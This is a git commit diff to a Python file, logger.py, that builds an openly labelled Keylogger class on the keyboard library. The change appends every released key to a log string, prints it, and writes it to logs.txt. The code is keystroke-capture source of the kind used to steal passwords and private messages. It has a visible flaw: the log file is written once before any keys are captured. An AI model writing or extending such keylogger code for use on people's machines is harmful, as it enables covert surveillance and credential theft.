8b5c3f51d9aa3f655356ed1a00b7c24c1f3b583b
gio <giovaniordonez33@gmail.com>
2021-05-13 22:20:08 -0400

    Added file creation

--- logger.py
+++ logger.py
@@ -3,8 +3,8 @@ import keyboard
 
 class Keylogger:
     def __init__(self):
-        self.log = ''
-
+        self.log = ""
+   
 
     def callback(self, event):
         '''
@@ -14,11 +14,22 @@ class Keylogger:
             to point to. The event callback has three attributes which are: name, scan_code
             (the ascii dec number for the char), time (timestamp)
         '''
-        print(event.name)
+        name = event.name
+        self.log += name
+        print(self.log)
+    
+    
+    def logging(self):
+        print(f"Log in the Logging(): {self.log}")
+        with open('logs.txt', 'w') as f:
+            f.write(self.log)
+
 
     def run(self):
         keyboard.on_release(callback=self.callback)
-
+        #print(self.log)
+        self.logging()
+        keyboard.wait() #causes a wait until we do ctl-c
 
 
 if __name__ == "__main__":
